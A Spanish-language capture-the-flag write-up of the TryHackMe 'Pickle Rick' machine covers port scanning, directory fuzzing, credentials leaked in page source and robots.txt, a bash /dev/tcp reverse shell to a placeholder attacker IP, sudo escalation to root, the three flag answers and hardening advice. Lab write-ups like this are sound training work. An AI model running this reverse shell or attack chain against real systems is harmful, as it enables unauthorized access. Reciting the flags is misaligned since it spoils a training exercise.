# **Explotación de Máquina Pickle Rick (TryHackMe)**

![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Tema: Web Exploitation](https://img.shields.io/badge/Tema-Web%20Exploitation-blue)

## **Descripción**
Este repositorio documenta la explotación completa de la máquina **Pickle Rick** de TryHackMe, basada en la serie animada *Rick and Morty*. La máquina involucra:
1. Análisis de código fuente web
2. Fuzzing de directorios
3. Explotación de panel de comandos
4. Escalada de privilegios mediante mala configuración de sudo

**Tiempo estimado**: 20-30 minutos  
**Dificultad**: Fácil  
**Sistema operativo**: Linux (Ubuntu)

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación Web](#explotación-web)
3. [Shell Inversa](#shell-inversa)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.58.40 -oN escaneo
```

**Hallazgos clave**:
- **Puerto 22/tcp**: SSH (filtrado/cerrado)
- **Puerto 80/tcp**: HTTP - Apache httpd 2.4.18 (Ubuntu)

### 2. Análisis Web
- Acceso a `http://10.10.58.40`
- Inspección de código fuente (Ctrl+U):
  ```html
  <!-- Username: R1ckRul3s -->
  ```
- **Usuario descubierto**: `R1ckRul3s`

### 3. Fuzzing de Directorios
```bash
dirb http://10.10.58.40/ /usr/share/wordlists/dirb/common.txt
```

**Directorios encontrados**:
- `/login.php` - Panel de autenticación
- `/robots.txt` - Archivo de exclusión de robots

### 4. Archivo robots.txt
```bash
curl http://10.10.58.40/robots.txt
```
**Contenido**:
```
Wubbalubbadubdub
```
- **Posible contraseña**: `Wubbalubbadubdub`

## **Explotación Web**

### 5. Acceso al Panel de Login
- URL: `http://10.10.58.40/login.php`
- Credenciales:
  - Usuario: `R1ckRul3s`
  - Contraseña: `Wubbalubbadubdub`
- **Resultado**: Acceso concedido a panel de comandos web

### 6. Primera Flag (Ingrediente 1)
```bash
ls
cat Sup3rS3cretPickl3Ingred.txt
```
- **Ingrediente 1**: `mr. meeseek hair`

## **Shell Inversa**

### 7. Establecimiento de Reverse Shell
**En el panel web**:
```bash
bash -c 'bash -i >& /dev/tcp/TU_IP_ATACANTE/443 0>&1'
```

**En máquina atacante**:
```bash
nc -lvnp 443
```
- **Shell obtenida como usuario `www-data`**

## **Escalada de Privilegios**

### 8. Segunda Flag (Ingrediente 2)
```bash
cd /home/rick
ls -la
cat "second ingredients"
```
- **Ingrediente 2**: `1 jerry tear`

### 9. Escalada a Root
```bash
sudo -l
```
**Resultado**:
```
User www-data may run ALL commands as root without password.
```

```bash
sudo su -
whoami
# Output: root
```

### 10. Tercera Flag (Ingrediente 3)
```bash
ls /root
cat /root/3rd.txt
```
- **Ingrediente 3**: `fleeb juice`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Exposición de credenciales en código fuente**
2. **Contraseña en archivo robots.txt** 
3. **Panel de comandos sin restricciones**
4. **Configuración insegura de sudo** (ALL NOPASSWD: ALL)

### Hardening Recomendado
- Eliminar comentarios sensibles del código fuente
- Restringir acceso a archivos de configuración
- Implementar validación de entrada en paneles de comandos
- Configurar sudo con mínimos privilegios necesarios

### Flags Obtenidas
1. **mr. meeseek hair** - Primer ingrediente
2. **1 jerry tear** - Segundo ingrediente  
3. **fleeb juice** - Tercer ingrediente


---

**Herramientas utilizadas**:
- Nmap
- Dirb
- Netcat
- Bash

**Referencias**:
- [TryHackMe - Pickle Rick Room](https://tryhackme.com/room/picklerick)
- [OWASP - Information Exposure](https://owasp.org/www-community/vulnerabilities/Information_exposure)
